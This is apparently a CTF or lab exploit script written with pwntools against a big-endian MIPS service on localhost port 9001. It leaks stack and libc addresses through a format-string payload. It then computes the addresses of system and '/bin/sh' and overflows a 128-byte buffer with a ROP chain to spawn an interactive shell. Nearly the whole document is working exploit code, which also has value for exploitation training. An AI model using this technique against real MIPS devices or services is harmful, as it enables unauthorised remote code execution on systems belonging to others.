from pwn import *

'''
Find gadgets with

ROPgadget --binary ../lib-mips/libc.so.6 --mipsrop registers | grep 'lw $a0' | grep 'lw $t9' | grep -v '$gp' | grep -v 'beqz'

Make sure in gdb you set endian to big
'''

context.arch = 'mips'
context.endian = 'big'

# Connect to the container's pwntools port
p = remote('localhost', 9001)

payload = b"%p " * 40

p.sendline(payload)

p.recvline()
p.recvline()
p.recvline()
result = p.recvline().split()
print(f'RESULT: {result}')

stack_pointer = int(result[-1], 16)
start_of_buffer = stack_pointer - 144 # Buffer starts 144 bytes under sp (128 byte buffer size and then 16 bytes of something)
puts_addr = int(result[5], 16)
puts_offset = 0x0008d3b0 - 0x00010000
libc_base = puts_addr - puts_offset

system_offset = 0x000636e8 - 0x00010000
system_addr = libc_base + system_offset

execve_offset = 0x000f0c5c - 0x00010000
execve_address = libc_base + execve_offset


# 0x00095a9c : subu $s3, $a1, $s1 ; b 0x95b04 ; lw $ra, 0x2c($sp) ; beqz $a1, 0x95b04 ; nop ; lw $t9, ($s0) ; jalr $t9 ; lw $a0, 4($s0)

#0x000414b4 : lw $ra, 0x24($sp) ; lw $v0, 0xc($s0) ; lw $t9, ($s0) ; lw $a0, 4($s0) ; jalr $t9 ; sw $v0, ($s1)

#0x0019bfa4 : lw $t9, ($s0) ; lw $a0, 4($s0) ; lw $ra, 0x24($sp) ; lw $s1, 0x20($sp) ; lw $s0, 0x1c($sp) ; jr $t9 ; addiu $sp, $sp, 0x28

gadget_addr = libc_base + 0x0019bfa4
print(f'GADGET ADDRESS: {hex(gadget_addr)}')

print(f'SYSEM ADDRESS: {hex(system_addr)}')
print(f'START OF BUFFER: {hex(start_of_buffer)}')
print(f"STACK POINTER: {stack_pointer}")

#argument = b"/bin/sh\0"
binsh = 0x1ba178 + libc_base

payload2 = p32(system_addr)
payload2 += p32(binsh)#p32(start_of_buffer + 8) # Pointer to argument
#payload2 += argument
payload2 += b"A"*(128 - len(payload2))
payload2 += p32(start_of_buffer)# s0
payload2 += p32(stack_pointer) # s1
payload2 += b"D"*4
payload2 += p32(gadget_addr) # Return address

print(f'payload2 hex: {payload2.hex()}')
print(f'offset 0 (system): {hex(u32(payload2[0:4]))}')
print(f'offset 4 (arg ptr): {hex(u32(payload2[4:8]))}')
print(f'offset 8 (string): {payload2[8:16]}')
print(f'total len: {len(payload2)}')

p.sendline(payload2)

print(p.recv(timeout=3))
p.interactive()